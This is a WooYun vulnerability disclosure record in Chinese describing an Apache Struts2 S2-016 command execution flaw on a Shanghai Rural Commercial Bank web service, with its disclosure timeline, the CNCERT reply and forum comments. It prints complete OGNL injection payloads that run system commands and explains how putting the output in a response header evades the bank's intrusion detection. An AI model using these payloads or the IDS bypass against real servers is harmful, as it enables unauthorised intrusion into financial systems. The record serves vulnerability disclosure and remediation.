{"id": 36914, "wybug_id": "wooyun-2015-0106471", "wybug_title": "绕过ids上海农商银行某站命令执行漏洞", "wybug_corp": "上海农商银行", "wybug_author": "cleanmgr", "wybug_date": "2015-04-07 22:08", "wybug_open_date": "2015-05-25 18:44", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向公众公开  简要描述： 上海农商银行某站命令执行漏洞 详细说明：  使用神器发现站点：http://map.srcb.com：8055/srcbGisPort/district/districtJson.do存在st2-016漏洞。但是使用常见的k8等工具：\n\n\n\n均提示“检测到入侵”，应该在互联网出口部署IPS/IDP等设备，无法验证该漏洞存在，通过抓包发现上述工具均使用下面的exp:\nredirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}\n那么肿么办呢？通过对神器进行抓包，发现神器使用两种exp进行测试，以whoami为例：第一种包：\nredirect:xxxxxx%24{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{%23req.getParameter(%22c0%22)})).start().getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23w%3d%23resp.getWriter(),%23w.println(\"12\"%2b\"1314:\"),%23w.println(%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()),%23w.flush(),%23w.close(),%23c.close(),%23b.close()}&c0=whoami\n第二种包：\nredirect:xxxxxx%24{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{%23req.getParameter(%22c0%22)})).start().getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23resp.addHeader(121314,%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()%2b555%2b%23d.readLine()),%23c.close(),%23b.close()}&c0=whomai\n但是发现第一种数据包也无法回显,依旧提示检测到入侵：\n\n但是第二种包能够在包头回显数据：\n\n\n\n\n\n\n\n\n\n对比两个代码，发现第二种代码通过\naddHeader\n将回显放在包头中：\n\n从而说明该IDP或IPS不对发送到服务器的数据包（包头、包体）进行特征码检测，而是只针对应答包的包体进行特征码检测，不对包头进行检测。   漏洞证明：  见上   修复方案：  升级，优化IDP或IPS的配置。   版权声明：转载请注明来源 cleanmgr@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-10 18:43 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给上海分中心，由上海分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-07 22:11 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我比较关心的是谁家的ids    \n     2015-04-07 22:34 |    \t\t木马人 \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:25        | 白，灰，黑)\t\t \n  IDS如何存在绕过的说法，求科普    \n     2015-04-07 22:36 |    \t\t月小对 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:23        | 打着篮球唱着歌)\t\t \n  我比较关心谁家的IDS可以做阻断功能，掉渣天    \n     2015-04-07 22:53 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  看看    \n     2015-04-07 23:06 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  嗯    \n     2015-04-08 00:00 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  IDS能阻断？    \n     2015-04-08 00:25 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  等着看。    \n     2015-04-08 08:54 |    \t\tNo.9 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 咳咳咳)\t\t \n  IDS只记录不阻断    \n     2015-04-08 09:39 |    \t\t毛猴 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:18        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  我比较关心的是谁家的ids     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}